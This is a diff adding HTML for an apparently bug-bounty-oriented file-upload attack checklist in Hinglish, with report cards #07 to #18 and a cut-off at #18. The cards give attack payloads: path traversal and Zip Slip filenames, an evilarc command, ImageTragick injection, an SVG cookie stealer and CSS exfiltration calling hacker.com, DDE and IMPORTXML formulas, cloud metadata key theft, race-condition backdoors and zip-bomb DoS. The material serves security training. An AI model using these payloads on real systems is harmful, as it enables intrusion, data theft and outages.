+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">03</span><span
+                            class="item-text"><strong>XSS via filename</strong> - <code
+                                class="c">&lt;script&gt;alert(1)&lt;/script&gt;.png</code> agar filename screen par
+                            dikhta hai.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">04</span><span
+                            class="item-text"><strong>Path Traversal in filename</strong> - <code
+                                class="c">../../../etc/passwd</code> as filename.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">05</span><span
+                            class="item-text"><strong>WAF bypass karo</strong> - <code class="c">;</code> block? <code
+                                class="c">%0a</code> (Newline) ya <code class="c">&amp;</code> use karo.</span>
+                    </li>
+                </ul>
+                <div class="card-progress">
+                    <div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span
+                            class="card-progress-pct">0%</span></div>
+                    <div class="card-bar-wrap">
+                        <div class="card-bar-fill"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="report-card" data-severity="high" id="report-07">
+            <div class="card-header">
+                <div class="card-meta">
+                    <div class="report-number">REPORT #07</div>
+                    <div class="report-title">S3 Bucket Misconfiguration - KYC Document Leak</div>
+                    <div class="report-target">Target: Major Fintech - $5,000 - High</div>
+                    <div style="margin-top:8px"><span class="technique-tag">../ Traversal</span><span
+                            class="technique-tag">Public Listing</span><span class="technique-tag">ACL Bypass</span>
+                    </div>
+                </div><span class="severity-badge sev-high">HIGH</span>
+            </div>
+            <div class="card-body">
+                <div class="scenario-box">
+                    <div class="scenario-label">SCENARIO</div>
+                    <div class="scenario-text">Upload URL: <code
+                            class="c">s3.amazonaws.com/target-uploads/user123/photo.jpg</code>. Filename: <code
+                            class="c">../user456/profile.jpg</code> - Path traversal success! Bucket root browse - XML
+                        listing - saare users ke KYC docs, Passports exposed!</div>
+                </div>
+                <div class="checklist-label">EXECUTION CHECKLIST</div>
+                <ul class="checklist">
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">01</span><span
+                            class="item-text"><strong>URL check karo</strong> - <code class="c">s3.amazonaws.com</code>
+                            ya <code class="c">storage.googleapis.com</code> se load ho raha?</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">02</span><span
+                            class="item-text"><strong>Path traversal test karo</strong> - Filename mein <code
+                                class="c">../</code> dalo, dusre folder mein upload hoti hai?</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">03</span><span
+                            class="item-text"><strong>Bucket listing check karo</strong> - Root URL browse karo. XML
+                            file dikhe = jackpot.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">04</span><span
+                            class="item-text"><strong>DELETE method test karo</strong> - Kisi aur ki file DELETE request
+                            se uda sakta hai?</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">05</span><span
+                            class="item-text"><strong>Pre-signed URLs check karo</strong> - <code
+                                class="c">Signature=...</code> expire ho raha ya permanent?</span>
+                    </li>
+                </ul>
+                <div class="card-progress">
+                    <div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span
+                            class="card-progress-pct">0%</span></div>
+                    <div class="card-bar-wrap">
+                        <div class="card-bar-fill"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="report-card" data-severity="critical" id="report-08">
+            <div class="card-header">
+                <div class="card-meta">
+                    <div class="report-number">REPORT #08</div>
+                    <div class="report-title">Zip Slip - Archive Path Traversal RCE</div>
+                    <div class="report-target">Target: Educational SaaS - $4,800 - Critical</div>
+                    <div style="margin-top:8px"><span class="technique-tag">../../../../</span><span
+                            class="technique-tag">Evilarc</span><span class="technique-tag">Symlink Attack</span></div>
+                </div><span class="severity-badge sev-critical">CRITICAL</span>
+            </div>
+            <div class="card-body">
+                <div class="scenario-box">
+                    <div class="scenario-label">SCENARIO</div>
+                    <div class="scenario-text">"Import Course Materials" - .zip upload. Evilarc se zip banao jisme file
+                        ka naam: <code class="c">../../../../var/www/html/evil.php</code>. Server extract kiya - file
+                        <code class="c">/uploads/course_1/</code> se bahar nikal kar <code
+                            class="c">/var/www/html/</code> mein land! Full RCE!</div>
+                </div>
+                <div class="checklist-label">EXECUTION CHECKLIST</div>
+                <ul class="checklist">
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">01</span><span
+                            class="item-text"><strong>Archive upload dhoondho</strong> - <code class="c">.zip</code>,
+                            <code class="c">.tar</code>, <code class="c">.gz</code>, <code class="c">.jar</code>
+                            formats.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">02</span><span
+                            class="item-text"><strong>Evilarc use karo</strong> - <code
+                                class="c">python evilarc.py -o unix -p var/www/html/ shell.php</code></span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">03</span><span
+                            class="item-text"><strong>Symlink attack test karo</strong> - Zip mein symlink dalo jo <code
+                                class="c">/etc/passwd</code> point kare.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">04</span><span
+                            class="item-text"><strong>Zip Bomb (DoS)</strong> - 42.zip = extract hone par Petabytes!
+                            Server crash.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">05</span><span
+                            class="item-text"><strong>Extraction path verify karo</strong> - Server files as-is rakhta
+                            hai ya rename karta hai?</span>
+                    </li>
+                </ul>
+                <div class="card-progress">
+                    <div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span
+                            class="card-progress-pct">0%</span></div>
+                    <div class="card-bar-wrap">
+                        <div class="card-bar-fill"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="report-card" data-severity="critical" id="report-09">
+            <div class="card-header">
+                <div class="card-meta">
+                    <div class="report-number">REPORT #09</div>
+                    <div class="report-title">ImageTragick (MVG/MSL) - News Media RCE</div>
+                    <div class="report-target">Target: Major News Outlet - $7,000 - Critical</div>
+                    <div style="margin-top:8px"><span class="technique-tag">push graphic-context</span><span
+                            class="technique-tag">url() pipe</span><span class="technique-tag">Delegates</span></div>
+                </div><span class="severity-badge sev-critical">CRITICAL</span>
+            </div>
+            <div class="card-body">
+                <div class="scenario-box">
+                    <div class="scenario-label">SCENARIO</div>
+                    <div class="scenario-text">Extension <code class="c">.jpg</code> par andar MVG code. ImageMagick ko
+                        <code class="c">url()</code> ke andar string shell command lagi - shell.sh download + execute =
+                        Full System Compromise!</div>
+                </div>
+                <div class="checklist-label">EXECUTION CHECKLIST</div>
+                <ul class="checklist">
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">01</span><span
+                            class="item-text"><strong>Engine detect karo</strong> - <code class="c">X-Powered-By</code>
+                            ya error mein ImageMagick ka naam?</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">02</span><span
+                            class="item-text"><strong>MVG format test karo</strong> - File start mein <code
+                                class="c">push graphic-context</code> + extension .jpg.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">03</span><span
+                            class="item-text"><strong>SVG redirects try karo</strong> - <code
+                                class="c">&lt;image xlink:href="..."&gt;</code> se SSRF check.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">04</span><span
+                            class="item-text"><strong>Delegates target karo</strong> - ImageMagick external programs
+                            (epstopdf) use karta hai.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">05</span><span
+                            class="item-text"><strong>Sleep check karo</strong> - <code
+                                class="c">fill 'url(https://...; sleep 10)'</code> se time-based confirm.</span>
+                    </li>
+                </ul>
+                <div class="card-progress">
+                    <div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span
+                            class="card-progress-pct">0%</span></div>
+                    <div class="card-bar-wrap">
+                        <div class="card-bar-fill"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="report-card" data-severity="critical" id="report-10">
+            <div class="card-header">
+                <div class="card-meta">
+                    <div class="report-number">REPORT #10</div>
+                    <div class="report-title">Race Condition (TOCTOU) - Cloud Hosting RCE</div>
+                    <div class="report-target">Target: Cloud Hosting - $6,000 - Critical</div>
+                    <div style="margin-top:8px"><span class="technique-tag">2s Window</span><span
+                            class="technique-tag">Self-Replicating</span><span class="technique-tag">Turbo
+                            Threads</span></div>
+                </div><span class="severity-badge sev-critical">CRITICAL</span>
+            </div>
+            <div class="card-body">
+                <div class="scenario-box">
+                    <div class="scenario-label">SCENARIO</div>
+                    <div class="scenario-text">Shell upload - "Malicious file detected and deleted" (2s delay).
+                        Self-replicating shell: Thread A lagatar upload. Thread B lagatar browse. Ek baar execute -
+                        <code class="c">backdoor.php</code> permanent! Server ne race.php uda di par backdoor ka pata
+                        nahi chala!</div>
+                </div>
+                <div class="checklist-label">EXECUTION CHECKLIST</div>
+                <ul class="checklist">
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">01</span><span
+                            class="item-text"><strong>Delay identify karo</strong> - Upload aur "Invalid File" error ke
+                            beech kitne seconds?</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">02</span><span
+                            class="item-text"><strong>Temp path dhoondho</strong> - <code class="c">/tmp/</code>, <code
+                                class="c">/uploads/temp/</code>, <code class="c">/var/www/html/tmp/</code>.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">03</span><span
+                            class="item-text"><strong>Burp Intruder use karo</strong> - Null Payloads, 50-100 threads,
+                            simultaneous upload+browse.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">04</span><span
+                            class="item-text"><strong>Self-replicating shell likho</strong> - Execute hote hi nayi file
+                            create kare.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">05</span><span
+                            class="item-text"><strong>Cloud Race test karo</strong> - Microservices mein network latency
+                            = bigger window.</span>
+                    </li>
+                </ul>
+                <div class="card-progress">
+                    <div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span
+                            class="card-progress-pct">0%</span></div>
+                    <div class="card-bar-wrap">
+                        <div class="card-bar-fill"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- PHASE 3 - RENDERING & CLIENT-SIDE -->
+<section class="phase-section" id="phase3">
+    <div class="phase-header"><span class="phase-number">PHASE 03</span><span class="phase-title">RENDERING &
+            CLIENT-SIDE - PDF SSRF / SVG XSS / DoS / IDOR / HTML Polyglot</span><span class="phase-count" id="p3count">0
+            / 5 reports</span></div>
+    <div class="cards-grid" id="grid-phase3">
+
+        <div class="report-card" data-severity="critical" id="report-11">
+            <div class="card-header">
+                <div class="card-meta">
+                    <div class="report-number">REPORT #11</div>
+                    <div class="report-title">PDF HTML Rendering SSRF - Resume Upload</div>
+                    <div class="report-target">Target: B2B SaaS - $4,000 - Critical</div>
+                    <div style="margin-top:8px"><span class="technique-tag">wkhtmltopdf</span><span
+                            class="technique-tag">XMLHttpRequest</span><span
+                            class="technique-tag">169.254.169.254</span></div>
+                </div><span class="severity-badge sev-critical">CRITICAL</span>
+            </div>
+            <div class="card-body">
+                <div class="scenario-box">
+                    <div class="scenario-label">SCENARIO</div>
+                    <div class="scenario-text">PDF upload - server thumbnail banata. PDF mein JS inject: <code
+                            class="c">x.open("GET","file:///etc/passwd"); x.send()</code>. Thumbnail mein <code
+                            class="c">root:x:0:0</code> text! Cloud: <code
+                            class="c">http://169.254.169.254/latest/meta-data/iam/security-credentials/</code> - AWS
+                        keys leaked!</div>
+                </div>
+                <div class="checklist-label">EXECUTION CHECKLIST</div>
+                <ul class="checklist">
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">01</span><span
+                            class="item-text"><strong>PDF preview check karo</strong> - Upload ke baad pehla page as
+                            image dikhta hai?</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">02</span><span
+                            class="item-text"><strong>HTML payloads inject karo</strong> - pdftk/scripts se metadata ya
+                            annotations mein.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">03</span><span
+                            class="item-text"><strong>Local paths test karo</strong> - <code
+                                class="c">file:///etc/passwd</code>, <code class="c">C:/windows/win.ini</code>.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">04</span><span
+                            class="item-text"><strong>Cloud metadata target karo</strong> - 169.254.169.254
+                            (AWS/GCP/Azure) se IAM roles churao.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">05</span><span
+                            class="item-text"><strong>iframe injection</strong> - <code
+                                class="c">&lt;iframe src="http://internal-ip"&gt;</code> se HTML-to-PDF
+                            Injection.</span>
+                    </li>
+                </ul>
+                <div class="card-progress">
+                    <div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span
+                            class="card-progress-pct">0%</span></div>
+                    <div class="card-bar-wrap">
+                        <div class="card-bar-fill"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="report-card" data-severity="high" id="report-12">
+            <div class="card-header">
+                <div class="card-meta">
+                    <div class="report-number">REPORT #12</div>
+                    <div class="report-title">SVG Stored XSS - Cookie Stealer via Avatar</div>
+                    <div class="report-target">Target: Freelance Marketplace - $3,000 - High</div>
+                    <div style="margin-top:8px"><span class="technique-tag">&lt;script&gt; in SVG</span><span
+                            class="technique-tag">Same-Origin</span><span class="technique-tag">onload Event</span>
+                    </div>
+                </div><span class="severity-badge sev-high">HIGH</span>
+            </div>
+            <div class="card-body">
+                <div class="scenario-box">
+                    <div class="scenario-label">SCENARIO</div>
+                    <div class="scenario-text">Profile pic .svg allowed. Payload: <code
+                            class="c">&lt;svg&gt;&lt;script&gt;fetch('https://hacker.com/log?c='+document.cookie)&lt;/script&gt;&lt;/svg&gt;</code>.
+                        Direct link share - victim open - browser SVG render - script execute - session cookie churaya -
+                        Account Takeover!</div>
+                </div>
+                <div class="checklist-label">EXECUTION CHECKLIST</div>
+                <ul class="checklist">
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">01</span><span
+                            class="item-text"><strong>SVG upload confirm karo</strong> - Profile pics, logos, icons mein
+                            .svg try.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">02</span><span
+                            class="item-text"><strong>Content-Type check karo</strong> - Server <code
+                                class="c">image/svg+xml</code> bhej raha hai?</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">03</span><span
+                            class="item-text"><strong>Content-Disposition check karo</strong> - <code
+                                class="c">attachment</code> hai toh XSS fail.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">04</span><span
+                            class="item-text"><strong>Event handlers try karo</strong> - <code
+                                class="c">&lt;svg onload="alert(1)"&gt;</code> agar script block.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">05</span><span
+                            class="item-text"><strong>foreignObject bypass</strong> - Base64 encode + <code
+                                class="c">&lt;foreignObject&gt;</code> ke andar chhupao.</span>
+                    </li>
+                </ul>
+                <div class="card-progress">
+                    <div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span
+                            class="card-progress-pct">0%</span></div>
+                    <div class="card-bar-wrap">
+                        <div class="card-bar-fill"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="report-card" data-severity="medium" id="report-13">
+            <div class="card-header">
+                <div class="card-meta">
+                    <div class="report-number">REPORT #13</div>
+                    <div class="report-title">Resource Exhaustion DoS - Pixel Flood & Zip Bomb</div>
+                    <div class="report-target">Target: Cloud Storage App - $2,500 - Medium</div>
+                    <div style="margin-top:8px"><span class="technique-tag">65535x65535 px</span><span
+                            class="technique-tag">Zip Bomb</span><span class="technique-tag">EDoS</span></div>
+                </div><span class="severity-badge sev-medium">MEDIUM</span>
+            </div>
+            <div class="card-body">
+                <div class="scenario-box">
+                    <div class="scenario-label">SCENARIO</div>
+                    <div class="scenario-text">No <code class="c">Content-Length</code> validation. Attack: 100
+                        concurrent 1GB streams + Pixel Flood (65535x65535 image = ImageMagick RAM crash) + Zip Bomb
+                        (100KB zip - 10GB extract). Server - OOM - 503!</div>
+                </div>
+                <div class="checklist-label">EXECUTION CHECKLIST</div>
+                <ul class="checklist">
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">01</span><span
+                            class="item-text"><strong>Size limits check karo</strong> - 1GB+ file upload ho rahi
+                            hai?</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">02</span><span
+                            class="item-text"><strong>Decompression bomb</strong> - 100KB zip - 10GB extract
+                            (42.zip).</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">03</span><span
+                            class="item-text"><strong>Multiple concurrent uploads</strong> - 50 tabs mein badi files -
+                            RAM usage.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">04</span><span
+                            class="item-text"><strong>Content-Length spoofing</strong> - Header mein <code
+                                class="c">999999999</code> dalo.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">05</span><span
+                            class="item-text"><strong>Pixel Flood image</strong> - 65535x65535 resolution - ImageMagick
+                            crash.</span>
+                    </li>
+                </ul>
+                <div class="card-progress">
+                    <div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span
+                            class="card-progress-pct">0%</span></div>
+                    <div class="card-bar-wrap">
+                        <div class="card-bar-fill"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="report-card" data-severity="high" id="report-14">
+            <div class="card-header">
+                <div class="card-meta">
+                    <div class="report-number">REPORT #14</div>
+                    <div class="report-title">File Storage IDOR - Passport & Document Leak</div>
+                    <div class="report-target">Target: Travel & Hotel Booking - $4,500 - High</div>
+                    <div style="margin-top:8px"><span class="technique-tag">Sequential IDs</span><span
+                            class="technique-tag">Directory Listing</span><span class="technique-tag">CDN Cache</span>
+                    </div>
+                </div><span class="severity-badge sev-high">HIGH</span>
+            </div>
+            <div class="card-body">
+                <div class="scenario-box">
+                    <div class="scenario-label">SCENARIO</div>
+                    <div class="scenario-text">Upload URL: <code class="c">/files/download?id=9958</code>. Intruder se
+                        <code class="c">id=9000..10000</code> brute-force - Server bina session check ke saari files di
+                        - Passports, Credit Cards!</div>
+                </div>
+                <div class="checklist-label">EXECUTION CHECKLIST</div>
+                <ul class="checklist">
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">01</span><span
+                            class="item-text"><strong>Filenames predict karo</strong> - <code
+                                class="c">IMG_1.jpg</code>, <code class="c">101.pdf</code> jaisa simple pattern?</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">02</span><span
+                            class="item-text"><strong>Directory listing check karo</strong> - URL se filename hata kar
+                            folder browse karo.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">03</span><span
+                            class="item-text"><strong>UUID leak dhoondho</strong> - Complex naam bhi API response mein
+                            leak ho sakte hain.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">04</span><span
+                            class="item-text"><strong>Cross-account test karo</strong> - Dusre account se apni file ka
+                            URL khol kar dekho.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">05</span><span
+                            class="item-text"><strong>CDN cache check karo</strong> - Cloudfront/Akamai par bina auth ke
+                            cached ho rahi?</span>
+                    </li>
+                </ul>
+                <div class="card-progress">
+                    <div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span
+                            class="card-progress-pct">0%</span></div>
+                    <div class="card-bar-wrap">
+                        <div class="card-bar-fill"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="report-card" data-severity="high" id="report-15">
+            <div class="card-header">
+                <div class="card-meta">
+                    <div class="report-number">REPORT #15</div>
+                    <div class="report-title">HTML Polyglot - Content-Sniffing Phishing Attack</div>
+                    <div class="report-target">Target: Employee Portal - $3,500 - High</div>
+                    <div style="margin-top:8px"><span class="technique-tag">JPEG + HTML</span><span
+                            class="technique-tag">X-Content-Type-Options</span><span class="technique-tag">Fake
+                            Login</span></div>
+                </div><span class="severity-badge sev-high">HIGH</span>
+            </div>
+            <div class="card-body">
+                <div class="scenario-box">
+                    <div class="scenario-label">SCENARIO</div>
+                    <div class="scenario-text"><code class="c">profile.jpg</code> ke andar HTML code. Employee ne link
+                        khola - browser magic bytes ignore - HTML render - fake login page dikhi - password enter kiya -
+                        hacker ke paas credentials!</div>
+                </div>
+                <div class="checklist-label">EXECUTION CHECKLIST</div>
+                <ul class="checklist">
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">01</span><span
+                            class="item-text"><strong>Image mein HTML dalo</strong> - .jpg/.png ke andar <code
+                                class="c">&lt;html&gt;</code> tags inject karo.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">02</span><span
+                            class="item-text"><strong>X-Content-Type-Options check karo</strong> - <code
+                                class="c">nosniff</code> hai toh attack fail.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">03</span><span
+                            class="item-text"><strong>Content-Type verify karo</strong> - Server <code
+                                class="c">text/html</code> ya <code class="c">image/jpeg</code> bhej raha?</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">04</span><span
+                            class="item-text"><strong>Mixed extensions</strong> - <code class="c">.html.jpg</code> ya
+                            <code class="c">.htm.png</code> se confuse.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">05</span><span
+                            class="item-text"><strong>GIF trick</strong> - GIF header mein HTML inject - proxy bypass
+                            90% chances.</span>
+                    </li>
+                </ul>
+                <div class="card-progress">
+                    <div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span
+                            class="card-progress-pct">0%</span></div>
+                    <div class="card-bar-wrap">
+                        <div class="card-bar-fill"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</section><!-- PHASE 4 - ADVANCED INJECTION VECTORS -->
+<section class="phase-section" id="phase4">
+    <div class="phase-header"><span class="phase-number">PHASE 04</span><span class="phase-title">ADVANCED INJECTION
+            VECTORS - SVG CSS / CSV Formula / SSRF URL / PDF-to-Internal / SSTI</span><span class="phase-count"
+            id="p4count">0 / 5 reports</span></div>
+    <div class="cards-grid" id="grid-phase4">
+
+        <div class="report-card" data-severity="high" id="report-16">
+            <div class="card-header">
+                <div class="card-meta">
+                    <div class="report-number">REPORT #16</div>
+                    <div class="report-title">SVG CSS Exfiltration - Token Stealing via Stylesheet</div>
+                    <div class="report-target">Target: Enterprise Collaboration - $2,800 - High</div>
+                    <div style="margin-top:8px"><span class="technique-tag">input[value^=]</span><span
+                            class="technique-tag">background-image</span><span class="technique-tag">No JS Needed</span>
+                    </div>
+                </div><span class="severity-badge sev-high">HIGH</span>
+            </div>
+            <div class="card-body">
+                <div class="scenario-box">
+                    <div class="scenario-label">SCENARIO</div>
+                    <div class="scenario-text">Website SVGs ko inline render karti. SVG mein CSS: <code
+                            class="c">input[value^="a"]{background-image:url("hacker.com/log?char=a")}</code>. Jab
+                        victim form bharta hai, CSS har character check karta aur hacker ke server par ping.
+                        Password/Token character-by-character leak! Bina JS ke!</div>
+                </div>
+                <div class="checklist-label">EXECUTION CHECKLIST</div>
+                <ul class="checklist">
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">01</span><span
+                            class="item-text"><strong>Inline rendering check karo</strong> - SVG <code
+                                class="c">&lt;img&gt;</code> mein hai ya seedha HTML mein?</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">02</span><span
+                            class="item-text"><strong>CSS selector test karo</strong> - <code
+                                class="c">body{display:none}</code> dalo. Site gayab = jackpot!</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">03</span><span
+                            class="item-text"><strong>Blind data steal</strong> - <code
+                                class="c">background-image</code> ya <code class="c">@import</code> se external URL
+                            ping.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">04</span><span
+                            class="item-text"><strong>Sanitizer bypass</strong> - CSS comments <code
+                                class="c">/* */</code> aur encoding use karo.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">05</span><span
+                            class="item-text"><strong>Font injection</strong> - Custom fonts load karke bhi data leak ho
+                            sakta hai.</span>
+                    </li>
+                </ul>
+                <div class="card-progress">
+                    <div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span
+                            class="card-progress-pct">0%</span></div>
+                    <div class="card-bar-wrap">
+                        <div class="card-bar-fill"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="report-card" data-severity="high" id="report-17">
+            <div class="card-header">
+                <div class="card-meta">
+                    <div class="report-number">REPORT #17</div>
+                    <div class="report-title">CSV/Excel Formula Injection - HR Portal Client-Side RCE</div>
+                    <div class="report-target">Target: HR & Payroll SaaS - $3,200 - High</div>
+                    <div style="margin-top:8px"><span class="technique-tag">=DDE("cmd")</span><span
+                            class="technique-tag">IMPORTXML</span><span class="technique-tag">Formula Prefix</span>
+                    </div>
+                </div><span class="severity-badge sev-high">HIGH</span>
+            </div>
+            <div class="card-body">
+                <div class="scenario-box">
+                    <div class="scenario-label">SCENARIO</div>
+                    <div class="scenario-text">"Employee List" CSV upload. Cell mein <code class="c">=2+5</code> - Excel
+                        mein 7 dikha = formula execute. DDE payload: <code
+                            class="c">=DDE("cmd";"/c calc.exe";"__DDE_TEST__")</code>. Admin ne "Enable Content" click -
+                        Calculator khuli! Real: <code class="c">powershell.exe</code> se reverse shell!</div>
+                </div>
+                <div class="checklist-label">EXECUTION CHECKLIST</div>
+                <ul class="checklist">
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">01</span><span
+                            class="item-text"><strong>CSV/Excel upload dhoondho</strong> - Bulk import, Data entry,
+                            Contact list features.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">02</span><span
+                            class="item-text"><strong>Simple formulas test karo</strong> - <code
+                                class="c">=SUM(1,2)</code>, <code class="c">-5+5</code>, <code
+                                class="c">@SUM(1,2)</code>.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">03</span><span
+                            class="item-text"><strong>Prefix characters check karo</strong> - <code class="c">=</code>,
+                            <code class="c">+</code>, <code class="c">-</code>, <code class="c">@</code> se
+                            shuru.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">04</span><span
+                            class="item-text"><strong>Data leak formula</strong> - <code
+                                class="c">=IMPORTXML("hacker.com?d="&amp;A1,"//a")</code>.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">05</span><span
+                            class="item-text"><strong>Sanitization bypass</strong> - <code class="c">'=SUM(1,2)</code>
+                            (leading apostrophe) try karo.</span>
+                    </li>
+                </ul>
+                <div class="card-progress">
+                    <div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span
+                            class="card-progress-pct">0%</span></div>
+                    <div class="card-bar-wrap">
+                        <div class="card-bar-fill"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="report-card" data-severity="critical" id="report-18">
+            <div class="card-header">
+                <div class="card-meta">
+                    <div class="report-number">REPORT #18</div>
